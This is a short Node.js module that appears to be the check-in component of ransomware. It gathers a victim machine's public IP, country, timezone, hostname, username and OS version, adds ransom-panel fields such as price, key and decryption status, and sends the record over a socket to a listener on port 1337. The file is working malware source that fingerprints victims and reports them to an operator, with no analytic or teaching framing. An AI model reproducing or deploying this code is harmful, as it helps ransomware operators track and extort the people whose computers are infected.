'use strict';
const net = require('net');
const os = require('os');
const request = require('request');
const parseString = require('xml2js').parseString;
const client = new net.Socket();
const url = "https://freegeoip.live/xml/";
const date = new Date();

var lut = []; for (var i = 0; i < 256; i++) { lut[i] = (i < 16 ? '0' : '') + (i).toString(16); }

module.exports.send = function () {

	client.connect(1337, '127.0.0.1', function () {

		request(url, function (_error, _response, body) {

			parseString(body, function (_err, result) {

				var data = {

					ID: uuid(),
					IP: String(result.Response.IP),
					Country: String(result.Response.CountryName),
					Flag: String(result.Response.CountryCode),
					PC: os.hostname(),
					User: os.userInfo().username,
					OS: os.version(),
					TimeZone: String(result.Response.TimeZone),
					DateTime: date.getFullYear() + "-" + ("0" + (date.getMonth() + 1)).slice(-2) + "-" + ("0" + date.getDate()).slice(-2) + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds(),
					Price: "0$",
					Key: "Key",
					Status: "Decrypted"
				};

				client.write(JSON.stringify(data));
				client.destroy();
			});
		});
	});
}

function uuid() {

	var d0 = Math.random() * 0xffffffff | 0;
	var d1 = Math.random() * 0xffffffff | 0;
	var d2 = Math.random() * 0xffffffff | 0;
	var d3 = Math.random() * 0xffffffff | 0;

	return lut[d0 & 0xff] + lut[d0 >> 8 & 0xff] + lut[d0 >> 16 & 0xff] + lut[d0 >> 24 & 0xff] + '-' +
		lut[d1 & 0xff] + lut[d1 >> 8 & 0xff] + '-' + lut[d1 >> 16 & 0x0f | 0x40] + lut[d1 >> 24 & 0xff] + '-' +
		lut[d2 & 0x3f | 0x80] + lut[d2 >> 8 & 0xff] + '-' + lut[d2 >> 16 & 0xff] + lut[d2 >> 24 & 0xff] +
		lut[d3 & 0xff] + lut[d3 >> 8 & 0xff] + lut[d3 >> 16 & 0xff] + lut[d3 >> 24 & 0xff];
}